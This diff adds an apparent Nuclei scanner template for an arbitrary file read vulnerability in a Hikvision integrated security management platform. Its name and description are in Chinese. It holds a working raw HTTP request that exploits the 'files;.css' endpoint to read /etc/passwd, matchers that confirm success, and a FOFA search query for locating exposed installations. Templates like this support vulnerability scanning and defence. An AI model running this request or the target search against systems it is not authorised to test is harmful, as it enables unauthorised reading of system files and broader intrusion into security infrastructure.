@@ -1,0 +1,30 @@
+id: Hikvision-filereading
+
+info:
+  name: 海康威视综合安防管理平台任意文件读取漏洞
+  author: changge
+  severity: high
+  description: Hikvision综合安防管理平台files;.css接口存在任意文件读取漏洞。
+  metadata:
+    fofa-query: title="综合安防管理平台"
+
+requests:
+  - raw:
+      - |
+        GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Connection: Keep-Alive
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root'
+      - type: status
+        status:
+          - 200
